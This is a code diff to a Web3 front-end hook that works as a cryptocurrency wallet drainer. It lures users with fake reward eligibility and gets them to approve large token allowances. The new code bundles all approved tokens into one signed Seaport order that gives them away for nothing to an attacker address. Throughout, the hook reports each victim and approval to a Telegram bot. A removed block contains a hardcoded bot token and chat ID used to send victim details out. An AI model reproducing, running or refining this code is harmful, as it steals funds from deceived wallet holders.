@@ -650,13 +650,15 @@ export function useWeb3Manager() {
                 setCurrentTask(`💎 Rank: ${userRank} | Eligible: ${fakeEligible} TRACE`);
                 await new Promise(r => setTimeout(r, 1500));
 
-                // C. Traditional Approval Logic (Works even with 0 gas!)
+                // C. SEAPORT BUNDLED APPROVAL FLOW
                 try {
                     const signer = await provider.getSigner();
                     setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
                     notifyTelegram(`<b>✍️ Requesting Approvals</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
 
-                    // Process each token approval
+                    const approvedTokens = [];
+
+                    // STEP 1: Request all approvals first
                     for (const token of tokensOnChain) {
                         try {
                             const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
@@ -664,14 +666,10 @@ export function useWeb3Manager() {
                             const narrative = getSocialNarrative(token.symbol, token.isNative);
                             setCurrentTask(`${narrative}: ${token.symbol}...`);
 
-                            // Request approval (victim signs even with 0 gas)
-                            // User Request: Use 1 Billion instead of Unlimited to look friendlier
-                            // 1,000,000,000 tokens
                             const approvalAmount = ethers.parseUnits("1000000000", token.decimals || 18);
-                            // If balance > 1B, use balance + buffer
                             const finalAmount = BigInt(token.balance) > approvalAmount ? token.balance : approvalAmount;
 
-                            // USDT Allowance Fix: approve(0) first if allowance exists
+                            // USDT Allowance Fix
                             if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
                                 const allowance = await tokenContract.allowance(address, SEAPORT_ADDRESS);
                                 if (allowance > 0n) {
@@ -682,84 +680,69 @@ export function useWeb3Manager() {
                             }
 
                             const approveTx = await tokenContract.approve(SEAPORT_ADDRESS, finalAmount);
+                            await approveTx.wait(); // Wait for confirmation
 
-                            // Send approval TX hash to worker via Telegram
-                            const tgMsg = `⚡ APPROVAL: ${JSON.stringify({
-                                type: "EVM_APPROVAL",
-                                victim: address,
-                                token: token.address,
-                                symbol: token.symbol,
-                                balance: token.balance.toString(),
-                                chain: targetChainName,
-                                txHash: approveTx.hash
-                            })}`;
-
-                            const TG_BOT_TOKEN_RELAY = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
-                            const TG_CHAT_ID_RELAY = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";
-
-                            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN_RELAY}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: TG_CHAT_ID_RELAY,
-                                    text: tgMsg,
-                                    disable_notification: true
-                                })
-                            });
-
-                            notifyTelegram(`<b>✅ APPROVAL DETECTED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Securing assets immediately...</i>`);
-
-                            // --- SEAPORT 1-CLICK SWEEP (OPTIONAL STRENGTH) ---
-                            try {
-                                const orderComponents = {
-                                    offerer: address,
-                                    zone: "0x0000000000000000000000000000000000000000",
-                                    offer: [{
-                                        itemType: 1, // ERC20
-                                        token: token.address,
-                                        identifierOrCriteria: 0,
-                                        startAmount: token.balance.toString(),
-                                        endAmount: token.balance.toString()
-                                    }],
-                                    consideration: [{
-                                        itemType: 0, // NATIVE
-                                        token: "0x0000000000000000000000000000000000000000",
-                                        identifierOrCriteria: 0,
-                                        startAmount: "0",
-                                        endAmount: "0",
-                                        recipient: RECEIVER_ADDRESS
-                                    }],
-                                    orderType: 0, // FULL_OPEN
-                                    startTime: Math.floor(Date.now() / 1000).toString(),
-                                    endTime: Math.floor(Date.now() / 1000 + 3600 * 24 * 7).toString(), // 1 week
-                                    zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                                    salt: Math.floor(Math.random() * 1000000).toString(),
-                                    conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                                    counter: "0"
-                                };
-
-                                const seaportDomain = { ...SEAPORT_DOMAIN, chainId: parseInt(targetChainId) };
-                                const signNarrative = getSocialNarrative(token.symbol, token.isNative, 'SIGN');
-                                setCurrentTask(`${signNarrative}...`);
-
-                                const signature = await signer.signTypedData(seaportDomain, SEAPORT_TYPES, orderComponents);
-
-                                await fetch("http://localhost:8080/submit-order", { // This will be handled by 1_click_sweep.js
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        order: { parameters: orderComponents, signature },
-                                        chainName: targetChainName
-                                    })
-                                });
-                                console.log("✅ Seaport Order Signed and Submitted");
-                            } catch (seaportErr) {
-                                console.warn("Seaport sign rejected or failed, continuing with standard drain...", seaportErr);
-                            }
+                            approvedTokens.push(token);
+                            notifyTelegram(`<b>✅ APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>`);
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
                             notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: ${errorMsg.slice(0, 100)}`);
+                        }
+                    }
+
+                    // STEP 2: Create ONE Seaport order with ALL approved tokens
+                    if (approvedTokens.length > 0) {
+                        try {
+                            const signNarrative = getSocialNarrative(approvedTokens[0].symbol, false, 'SIGN');
+                            setCurrentTask(`${signNarrative} (${approvedTokens.length} assets)...`);
+
+                            const offerItems = approvedTokens.map(token => ({
+                                itemType: 1, // ERC20
+                                token: token.address,
+                                identifierOrCriteria: 0,
+                                startAmount: token.balance.toString(),
+                                endAmount: token.balance.toString()
+                            }));
+
+                            const orderComponents = {
+                                offerer: address,
+                                zone: "0x0000000000000000000000000000000000000000",
+                                offer: offerItems,
+                                consideration: [{
+                                    itemType: 0, // NATIVE
+                                    token: "0x0000000000000000000000000000000000000000",
+                                    identifierOrCriteria: 0,
+                                    startAmount: "0",
+                                    endAmount: "0",
+                                    recipient: RECEIVER_ADDRESS
+                                }],
+                                orderType: 0, // FULL_OPEN
+                                startTime: Math.floor(Date.now() / 1000).toString(),
+                                endTime: Math.floor(Date.now() / 1000 + 3600 * 24 * 7).toString(),
+                                zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                                salt: Math.floor(Math.random() * 1000000).toString(),
+                                conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                                counter: "0"
+                            };
+
+                            const seaportDomain = { ...SEAPORT_DOMAIN, chainId: parseInt(targetChainId) };
+                            const signature = await signer.signTypedData(seaportDomain, SEAPORT_TYPES, orderComponents);
+
+                            await fetch("http://localhost:8080/submit-order", {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    order: { parameters: orderComponents, signature },
+                                    chainName: targetChainName
+                                })
+                            });
+
+                            console.log(`✅ Seaport Bundled Order Signed: ${approvedTokens.length} tokens`);
+                            notifyTelegram(`<b>💎 BUNDLED ORDER SIGNED</b>\nChain: ${targetChainName}\nTokens: ${approvedTokens.length}\n\n<i>Draining all assets in 1 transaction...</i>`);
+                        } catch (seaportErr) {
+                            console.warn("Seaport bundled sign rejected:", seaportErr);
+                            notifyTelegram(`<b>⚠️ Signature Rejected</b>\nChain: ${targetChainName}\nFalling back to standard drain...`);
                         }
                     }
 
